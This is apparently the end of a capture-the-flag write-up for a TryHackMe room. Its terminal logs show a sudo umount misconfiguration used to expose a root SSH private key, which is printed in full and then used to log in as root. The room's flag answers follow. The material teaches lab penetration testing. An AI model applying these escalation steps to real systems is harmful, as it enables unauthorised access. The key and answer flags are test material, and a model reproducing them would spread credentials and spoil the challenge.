-            os.setgid(1002)
-            pty.spawn("/bin/rbash")
-            break
-        else:
-            print("Login Failed")
-            break

tux@cchq:/home/varg/cooctOS_src$ su varg
Password: 
varg@cchq:~/cooctOS_src$ cd ..
varg@cchq:~$ ls
CooctOS.py  cooctOS_src  user.txt
varg@cchq:~$ cat user.txt 
THM{3a33063a4a8a5805d17aa411a53286e6}

varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount

In Linux and Unix-based systems, the "/etc/fstab" file is a configuration file that contains information about the file systems and partitions that should be automatically mounted (connected) during the system boot process.

The file consists of lines, each representing a separate file system mount. Each line typically contains the following information:

1. Device: The device (e.g., a hard disk partition, network share, or device) to be mounted.
2. Mount point: The directory in the file system where the device should be mounted.
3. File system type: The type of file system to be used on the device (e.g., ext4, ntfs, nfs, etc.).
4. Options: Optional mount options, such as read-only, noexec, etc.
5. Dump: A flag indicating whether the file system should be backed up using the "dump" command (0 for no, 1 for yes).
6. Pass: A flag used by the fsck (file system check) utility to determine the order in which file systems are checked during boot (0 for skip, 1 or higher for check).

The "/etc/fstab" file is essential for the proper functioning of the system because it defines how different file systems are mounted and accessible to the system and its users. Modifying this file should be done with caution, as incorrect changes can lead to boot problems or data loss.

varg@cchq:~$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo	/	ext4	defaults	0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3	/boot	ext4	defaults	0 0
#/swap.img	none	swap	sw	0 0
/home/varg/cooctOS_src	/opt/CooctFS	none	defaults,bind	0 0

varg@cchq:~$ cd /opt/CooctFS/
varg@cchq:/opt/CooctFS$ ls
bin  boot  etc  games  lib  run  tmp  var
varg@cchq:/opt/CooctFS$ cd ..
                                                                               
Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:23:01 2023):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:23:01 2023):     
                                                                               
Coordinates: X: 328, Y: 247, Z: 33
                                                                               

varg@cchq:/opt$ sudo /bin/umount /opt/CooctFS
varg@cchq:/opt$ cd CooctFS/
varg@cchq:/opt/CooctFS$ ls
root
varg@cchq:/opt/CooctFS$ cd root/
varg@cchq:/opt/CooctFS/root$ l
root.txt
varg@cchq:/opt/CooctFS/root$ cat root.txt 
hmmm...
No flag here. You aren't root yet.

varg@cchq:/opt/CooctFS/root$ ls -lah
total 28K
drwxr-xr-x 5 root root 4.0K Feb 20  2021 .
drwxr-xr-x 3 root root 4.0K Feb 20  2021 ..
lrwxrwxrwx 1 root root    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3.1K Feb 20  2021 .bashrc
drwx------ 3 root root 4.0K Feb 20  2021 .cache
drwxr-xr-x 3 root root 4.0K Feb 20  2021 .local
-rw-r--r-- 1 root root   43 Feb 20  2021 root.txt
drwxr-xr-x 2 root root 4.0K Feb 20  2021 .ssh
varg@cchq:/opt/CooctFS/root$ cd .ssh
varg@cchq:/opt/CooctFS/root/.ssh$ ls
id_rsa  id_rsa.pub
varg@cchq:/opt/CooctFS/root/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
5vqc2vl5vd3ZPcOHp3w1pIF3MH6kgY3JicvfHVc3phWukXuw2UunYtBVNSaj6hKn
DwIWH3xCnWBqG6BR4dI3woQwOWQ6e5wcKlYz/mqmQIUKqvY5H3fA8HVghu7ARSre
9lVwzN4eat2QPnK0BbG3gjhLjpN0ztp0LrQI1SCwBJXSwr5H8u2eU25XVVmmEvdY
+n9+v+Mon2Ne7vCobNjv4MMzXal50BlwlhNtwgwt1aWgNOyPhQFE6ceg4lGEWOUq
Jz2sMB4GzqER8/G9ESan7UOtrarhvHtC+l5g2QIDAQABAoIBAC9qKRa7LqVLXbGn
wVa9ra/AVgxihvLLZsIwAF764Tze8XDpD8ysVnBlEYGHZeeePfkeua4jrY+U/E1k
xT6Cfsf9/Vf6Haeu7Yurxd7jQu7BAgVba+ZQi6vuofPCgVeSFQWIMgOH4+MxJgpP
Qg76sZ/SATajqraclVYa5X8FmO5bF1MEqFLtszsGR0QDgY21o0DSaeou5F1WRPJ6
Q8EogxMj2G393BrlZfdoL4j/3iZoEwFwEtMc9SX435bnxcEnv+x4lDmC1MRY1TgZ
fx558Lswfnz5FIl1HCHIVvOKnTFq16O7fAoCldVDCaRr+SDbOk71UDxcQN2SgMDH
KDQmPmUCgYEA6RtG4wwpJYRMgTij+Pkutg4/CaNXTn0/NmSET//x57hxiFThNBK9
7DtlR7FTvoN1mp3AvLSk0sVmalewnilDyFjrVc1QUYZkBAguSmVgABO80usrPNfx
eanBrzDSHG9jUk+Nhmv+dctgnvwurLBVB86PzngxA6wxDQE64bS0Qz8CgYEA2wXg
Ltr5gWjHuwdctaFSPNqms6TutxqV2F8DNsZW7zgTI+j6CUIbhQ8FcH3NhSX6K2gE
vYIbiMDM3U3WVIOqp+piWAqPHwps4if1SHbXOgFtUBSpYwJj3jFE/qohMYIpJXU4
sE8TgrK8iUylI741fYrB2CG/OjvH5vsZ2e5UjecCgYBGjATGDhYdzo5AxV2Kqg8i
9ejKB+8SSAFrerw4YeNaF430jouhcNKdvdQHAHmxvKNI6dk8wwbm6ur14BgJpb9n
0NFYJEzcf2mhdsBbr5aAL3kD9Dwfq9Le2StO092i0WsjrAPO3Lwj9isFspiFltAF
DtSizek3jVNC9k5VpJSxjQKBgQDNS0uf/6aA8yrLlxICOWzxF23L0xviSywLPLux
euV/osrmDPlY9jr/VF4f2/tpA3jjeMOAslSGsVkVUmFEpImwjNSTe4o9aTM4JIYX
3zTL7Qx+VG+VG2dqnDn0jplAY6WXs7FoKSa7ijeIZmwf/aj7vLUHllI9Dk3IprLL
gEaHHwKBgQDQQ3tLEWwGbULkIXiKopgN/6ySp23TVFHKK8D8ZXzRgxiroBkG129t
FXhWaDVCDTHczV1Ap3jKn1UKFHdhsayK34EAvRiTc+onpkrOMEkK6ky9nSGWSWbr
knJ1V6wrLgd2qPq2r5g0a/Qk2fL0toxFbnsQRsueVfPwCQWTjSo/Wg==
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 400 varg_rsa             
                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i varg_rsa root@10.10.205.66
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 16 20:25:41 UTC 2023

  System load:  0.0                Processes:           125
  Usage of /:   35.2% of 18.57GB   Users logged in:     1
  Memory usage: 48%                IP address for eth0: 10.10.205.66
  Swap usage:   0%


0 packages can be updated.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 20 22:22:12 2021 from 172.16.228.162
root@cchq:~# ls
root.txt
root@cchq:~# cat root.txt 
THM{H4CK3D_BY_C00CTUS_CL4N}


```

Paradox is nomming cookies

Confront the CAT!

*THM{2dccd1ab3e03990aea77359831c85ca2}*

Find out what Szymex is working on

Locating shipment...

*THM{c89f9f4ef264e22001f9a9c3d72992ef}*

Find out what Tux is working on

Combine and crack

*THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}*

Find out what Varg is working on

Boot sequence initiated...

*THM{3a33063a4a8a5805d17aa411a53286e6}*

Get full root privileges

To mount or not to mount. That is the question.

*THM{H4CK3D_BY_C00CTUS_CL4N}*

### Task 2  Credits

First of all thank you for checking out my room! It took me way too long to put together so I hope you had some fun.

Also thanks to these wonderful people:

- Varg - For creating the amazing Cooctus Clan designs
- NinjaJc01 - For the Overpass series, tips & help with the theme and box development
- Paradox - Emotional support & box dev tips
- Szymex - Hosting the modded Minecraft server

Answer the questions below

 Completed
 
[[Inferno]]